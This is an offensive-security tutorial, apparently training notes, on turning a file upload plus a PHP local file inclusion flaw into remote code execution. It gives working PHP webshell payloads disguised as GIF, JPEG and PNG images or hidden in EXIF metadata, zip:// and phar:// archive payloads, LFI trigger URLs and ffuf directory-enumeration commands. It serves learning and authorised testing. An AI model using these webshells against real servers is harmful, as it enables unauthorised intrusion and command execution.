# LFI via File Upload

This attack chain is one of the most reliable paths to RCE because it does not require the file upload functionality itself to be vulnerable. You only need the ability to store a file on the server. The LFI vulnerability does the rest.

The core principle is that PHP's `include()` function does not validate content against extension. It executes whatever PHP code it finds inside any file it includes, whether that file is named `.php`, `.gif`, `.jpg`, or anything else.

***

## Method 1: Malicious Image Upload (Most Reliable)

The approach embeds a PHP webshell inside what appears to be a valid image file. Upload filters typically check two things: the file extension and the [file magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) at the start of the file content. Both can be satisfied while still including executable PHP code.

**Create the malicious image:**

```bash
# GIF magic bytes are ASCII, simplest to work with
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# JPEG magic bytes (binary, use printf)
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg

# PNG magic bytes
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png
```

GIF is the preferred format here because `GIF8` (or `GIF89a`) is plain ASCII, requiring no binary encoding. Other formats use binary magic bytes that complicate shell crafting but work identically once uploaded.

**Alternative: embed in EXIF metadata** using `exiftool`, which hides the payload deeper in the file structure and evades basic content scanners:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit_image.jpg -o shell.jpg
```

After uploading, find the stored file path by inspecting the page source where the image is rendered:

```html
<img src="/profile_images/shell.gif" class="profile-image">
```

Then trigger execution through the LFI:

```
http://TARGET/index.php?language=./profile_images/shell.gif&cmd=id
```

If the LFI prepends a directory, traverse out first:
```
http://TARGET/index.php?language=../../profile_images/shell.gif&cmd=id
```

***

## Method 2: zip:// Wrapper

The [zip:// stream wrapper](https://www.php.net/manual/en/wrappers.compression.php) treats a ZIP archive as a filesystem and allows including individual files within it. This is useful when direct image inclusion is blocked but ZIP uploads are allowed. The wrapper is not enabled by default so it is less reliable than method 1, but worth attempting when direct image inclusion fails.

**Build the payload:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
# shell.jpg is now a ZIP archive containing shell.php
```

Naming the archive `.jpg` satisfies extension checks on many upload forms. Note that content-type validation may still detect the ZIP signature (`PK\x03\x04`) regardless of the filename extension, so this approach works more reliably when ZIP uploads are explicitly permitted.

**Trigger via LFI:**

```
http://TARGET/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

The `%23` is URL-encoded `#`, which is the separator between the archive path and the internal file path in the `zip://` wrapper syntax.

***

## Method 3: phar:// Wrapper

[PHAR (PHP Archive)](https://www.php.net/manual/en/book.phar.php) is PHP's native archive format, similar to Java's JAR files. The `phar://` wrapper loads files from within a PHAR archive during inclusion, and beyond basic RCE it also enables PHP object injection attacks when `unserialize()` is called on a phar path, making it a more powerful technique in certain scenarios.

**Create the PHAR generator script:**

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

**Compile and rename:**

```bash
# phar.readonly must be disabled to create PHAR files
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg
```

The `__HALT_COMPILER()` stub is mandatory in all PHAR files. It marks the end of the PHP execution section and the beginning of the archive manifest. Without it the file is not a valid PHAR.

**Trigger via LFI:**

```
http://TARGET/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

The `%2F` is URL-encoded `/`, separating the archive path from the sub-file path inside the archive.

***

## Method Comparison

| Method | Extension Bypass | Magic Byte Support | Default Availability | Best Used When |
|--------|-----------------|-------------------|---------------------|----------------|
| Direct image + LFI | Yes (any ext) | Yes (GIF/JPEG/PNG) | Always | Upload allows images, LFI executes files |
| `zip://` wrapper | Partial (ext only) | No (ZIP sig detectable) | Not default | ZIP uploads allowed, direct inclusion blocked |
| `phar://` wrapper | Yes | Configurable | Not default | Object injection chain also present |

***

## Finding the Upload Path When It Is Not Visible

If the application does not render the uploaded file in a predictable location, use ffuf to enumerate common upload directories:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://TARGET/FUZZ \
     -mc 200,301,403

# Then fuzz for your specific filename inside discovered directories
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
     -u http://TARGET/FUZZ/shell.gif \
     -mc 200
```

Common upload directory names include `uploads/`, `files/`, `media/`, `images/`, `profile_images/`, `avatars/`, and `tmp/`. Once the path is confirmed, the LFI inclusion follows the same pattern regardless of where the file landed.
